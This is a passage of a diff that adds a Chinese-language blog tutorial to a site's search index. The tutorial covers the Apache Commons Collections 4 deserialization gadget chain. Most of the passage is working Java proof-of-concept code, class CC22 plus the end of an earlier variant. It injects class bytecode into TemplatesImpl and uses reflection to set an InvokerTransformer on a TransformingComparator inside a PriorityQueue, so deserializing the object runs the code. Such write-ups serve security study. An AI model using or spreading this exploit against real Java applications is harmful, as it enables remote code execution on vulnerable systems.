class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformField.setAccessible(true);</span><br><span class="line">        transformField.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>运行测试：</p>
+<p>序列化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908105736346.png"
+                      alt="image-20230908105736346"
+                ></p>
+<p>反序列化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908105757687.png"
+                      alt="image-20230908105757687"
+                ></p>
+<h2 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h2><p>当然其实我们这里也可以不用chaintransform</p>
+<p>直接调用invokertransform</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908111136994.png"
+                      alt="image-20230908111136994"
+                ></p>
+<p>POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC22 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">         setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator transformingComparator =new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformField.setAccessible(true);</span><br><span class="line">        transformField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908112513474.png"
+                      alt="image-20230908112513474"
+                ></p>
+<h2 id="三、总结-1"><a href="#三、总结-1" class="headerlink" title="三、总结"></a>三、总结</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908112556125.png"
+                      alt="image-20230908112556125"
+                ></p>
+]]></content>
+      <tags>
+        <tag>JAVA</tag>
+      </tags>
+  </entry>
 </search>
